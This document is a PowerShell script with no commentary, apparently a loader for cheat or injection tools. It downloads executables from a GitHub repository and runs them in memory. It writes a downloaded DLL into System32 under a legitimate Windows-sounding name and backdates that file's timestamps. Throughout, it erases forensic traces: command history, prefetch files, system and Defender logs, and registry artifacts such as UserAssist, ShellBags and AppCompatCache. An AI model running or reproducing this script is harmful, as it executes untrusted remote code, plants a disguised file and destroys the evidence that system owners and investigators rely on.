$link = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/IME.exe"
$webClient = New-Object System.Net.WebClient
$bytes = $webClient.DownloadData($link)
$assembly = [System.Reflection.Assembly]::Load($bytes)
$entry = $assembly.EntryPoint

Stop-Process -Name "runonce" -Force
Stop-Process -Name "runonce.exe" -Force
Clear-RecycleBin -Force
Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "UpdateExeVolatile" -Force -ErrorAction SilentlyContinue
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue
fsutil behavior set disablelastaccess 1
$timeout = (Get-Date).AddSeconds(60)

while ((Get-Date) -lt $timeout) {
    if (Get-Process Discord -ErrorAction SilentlyContinue) {
        break
    }
    Start-Sleep 1
}

if (-not (Get-Process Discord -ErrorAction SilentlyContinue)) {
    {
Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue
Exit
    }.Invoke()
}

$invokeArgs = New-Object object[] 1 
$invokeArgs[0] = [string[]]@() 
$entry.Invoke($null, $invokeArgs)

$os = Get-CimInstance Win32_OperatingSystem
$installDateTime = [Management.ManagementDateTimeConverter]::ToDateTime($os.InstallDate)
Set-Date -Date $installDateTime
$ProgressPreference='SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/zold1337/toolsvip/raw/refs/heads/main/XD2.dll' -OutFile "C:\Windows\System32\BluetoothDesktopHandlers.dll"


$f = "C:\Windows\System32\BluetoothDesktopHandlers.dll"
$d = (Get-CimInstance Win32_OperatingSystem).InstallDate
(Get-Item $f).CreationTime = $d
(Get-Item $f).LastWriteTime = $d
(Get-Item $f).LastAccessTime = $d
Set-ItemProperty "$env:windir\System32\BluetoothDesktopHandlers.dll" -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue > $null 2>&1
net stop w32time > $null 2>&1
net start w32time > $null 2>&1
w32tm /resync /force > $null 2>&1

Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\CBS\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\CrashDumps\*.dmp"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\MoSetup\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Panther\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\inf\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\System32\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Logs\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\SoftwareDistribution\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\Windows\Microsoft.NET\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\WebCache\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\SettingSync\*.log"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\ThumbCacheToDelete\*.tmp"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Terminal Server Client\Cache\*.bin"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows\WER\ReportArchive\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "C:\ProgramData\Microsoft\Windows Defender\Scans\History\Service\*"
Remove-Item -Force -Recurse -ErrorAction SilentlyContinue "$env:LOCALAPPDATA\Microsoft\Windows\History\*"

Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Applets\Regedit" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\UFH\SHC" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.dll\OpenWithList" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\WinRAR\ArcHistory" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\WinRAR\DialogEditHistory\ExtrPath" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Persisted" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKLM:\SYSTEM\ControlSet001\Control\Session Manager\AppCompatCache" -Recurse -Force -ErrorAction SilentlyContinue


Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch" -Recurse -Force -ErrorAction SilentlyContinue


Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\CIDSizeMRU" -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count" -Recurse -Force -ErrorAction SilentlyContinue

Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue



$services = @(
    "vss",
    "dps",
    "diagtrack",
    "bam",
    "dam",
    "sysmondrv",
    "sysmon",
    "sysmain",
    "eventlog"
)

Start-Sleep -Seconds 5
foreach ($svc in $services) {
    Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
}
Remove-Item -Path "C:\Windows\Prefetch\POWERSHELL*" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\Prefetch\RUNONCE*" -Force -ErrorAction SilentlyContinue
Remove-Item -Force -ErrorAction SilentlyContinue "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
Clear-History -ErrorAction SilentlyContinue

$link2 = "https://github.com/zold1337/toolsvip/raw/refs/heads/main/ST.exe"
$webClient2 = New-Object System.Net.WebClient
$bytes2 = $webClient2.DownloadData($link2)
$assembly2 = [System.Reflection.Assembly]::Load($bytes2)
$entry2 = $assembly2.EntryPoint
$invokeArgs2 = New-Object object[] 1 
$invokeArgs2[0] = [string[]]@() 
$entry2.Invoke($null, $invokeArgs2)
Exit
